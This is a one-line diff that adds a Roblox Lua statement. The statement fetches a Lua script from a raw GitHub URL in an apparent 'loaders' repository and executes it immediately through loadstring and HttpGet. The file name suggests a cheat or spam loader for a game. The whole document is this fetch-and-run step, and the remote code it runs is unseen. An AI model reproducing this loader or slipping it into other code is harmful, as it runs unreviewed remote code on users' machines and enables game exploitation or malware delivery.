@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/upd-forsaken-spam1-li33su6chd7d9t.lua"))()
